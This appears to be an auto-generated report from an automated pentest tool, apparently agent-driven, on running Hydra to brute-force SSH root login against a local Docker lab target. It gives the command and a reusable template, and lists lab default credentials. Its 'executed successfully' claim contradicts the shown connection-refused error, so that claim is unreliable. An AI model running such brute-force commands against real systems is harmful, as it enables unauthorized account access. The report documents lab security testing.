# hydra-ssh

## Tool Name & Category
| Field | Value |
|-------|-------|
| **Category** | auth — Authentication / Credential Testing |
| **Binary** | `hydra` ✅ installed |
| **Agent** | auth |
| **DVWA-optimized** | False |
| **Lab target** | `aegis-target` |

## Official Purpose
SSH brute force

## Exact Command(s) Executed
```bash
# SAFETY CHECK PASSED — local Docker lab only (DVWA + Juice Shop)
hydra -l root -P /usr/share/wordlists/rockyou.txt aegis-target ssh
```

| Metric | Value |
|--------|-------|
| Duration | 0.73s |
| Exit code | 255 |
| Effectiveness | **5/10** — Non-zero exit but useful output |

## Key Findings
- No automated findings extracted — review output below

## Full Output Summary
```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-24 05:47:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://aegis-target:22/

--- STDERR ---
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[ERROR] could not connect to ssh://172.22.0.2:22 - Connection refused

```

## What I Learned / Edge Cases / Gotchas
- Executed successfully in isolated lab
- Registry template: `hydra -l root -P /usr/share/wordlists/rockyou.txt {host} ssh {extra}`

## Recommended Safe Parameters for Learning Labs
- Scope: `localhost:8080` (DVWA) or `localhost:3000` (Juice Shop) only
- From Kali network: `aegis-target`, `aegis-juice`
- DVWA login: `admin` / `password` — use `/workspace/dvwa_login.sh` for cookie-aware tools
- Suggested timeout: 180s

## Next Steps for Exploration & Development
Run `hydra --help` and tune `hydra -l root -P /usr/share/wordlists/rockyou.txt {host} ssh {extra}` for your target.

---
*GrokStrike v2 — 2026-06-24T05:47:46.238853+00:00*
